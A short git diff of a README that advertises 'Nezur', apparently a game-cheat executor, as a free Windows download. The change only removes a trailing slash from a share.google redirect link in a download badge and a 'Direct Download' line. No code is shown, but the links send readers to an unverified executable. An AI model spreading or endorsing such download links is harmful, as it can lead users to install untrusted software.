@@ -11,12 +11,12 @@
 ---
 
 <p align="center">
-  <a href="https://share.google/OrQEnSOIN3vIIQZfR/">
+  <a href="https://share.google/OrQEnSOIN3vIIQZfR">
     <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Executor%20Latest-brightgreen?style=for-the-badge" alt="Download Nezur">
   </a>
 </p>
 
-> **[⬇️ Direct Download — Nezur](https://share.google/OrQEnSOIN3vIIQZfR/)**
+> **[⬇️ Direct Download — Nezur](https://share.google/OrQEnSOIN3vIIQZfR)**
 > Windows 10 / 11 · 64-bit · Free · No Key Required
 
 ---
